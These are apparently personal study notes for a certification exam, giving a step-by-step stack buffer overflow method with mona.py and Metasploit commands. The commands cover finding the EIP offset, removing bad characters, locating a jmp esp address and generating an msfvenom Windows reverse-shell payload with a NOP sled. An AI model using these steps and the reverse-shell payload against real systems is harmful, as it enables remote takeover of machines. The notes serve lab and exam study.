# BOF Notes

1. Set working folder: `!mona config -set workingfolder c:\mona\%p`
2. Create cyclic pattern: `msf-pattern_create -l <crashbytes+400>`
3. Find the cyclic EIP location (to get the padding length)
	1. `!mona findmsp -distance <pattern_create value>`
	OR
	2. `msf-pattern_offset -l <pattern_create value> -q <EIP value>`
4. Identify badchars:
	1. Create the badchar array: `!mona bytearray -b "\x00"`
	2. Identify chars:`!mona compare -f c:\mona\path\bytearray.bin -a <ESP address>`
	3. Repeat bytearray and compare until all badchars are gone. Remember that badchars can affect the next byte as well, or even the entire string.
5. After finding the badchar, find a working `jmp esp` location:
`!mona jmp -r esp -cpb "<bad chars">`
6. Create the payload: 
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... EXITFUNC=thread -b "<bad chars>" -f py
```
7. Add the NOP sled (`"\x90"*16`)

Note: while doing the initial test, I might want to use -p windows/exec CMD=calc.exe instead to verify the BOF itself works fine (on the test machine) before I create the revshell for the exam box.
